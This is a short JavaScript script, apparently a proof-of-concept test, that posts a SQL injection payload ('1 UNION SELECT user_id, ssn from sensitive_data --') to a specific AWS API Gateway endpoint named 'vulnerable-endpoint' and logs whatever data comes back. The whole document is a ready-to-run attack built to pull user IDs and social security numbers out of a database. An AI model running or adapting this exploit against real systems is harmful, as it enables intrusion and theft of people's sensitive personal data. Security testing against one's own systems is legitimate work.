async function testVulnerableEndpoint() {
  const response = await fetch('https://avy5samxsc.execute-api.us-east-1.amazonaws.com/prod/vulnerable-endpoint', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ "id": "1 UNION SELECT user_id, ssn from sensitive_data --" })
  });

  console.log("Status:", response.status);

  const data = await response.json();

  console.log("Response Data:", data);
}

testVulnerableEndpoint();
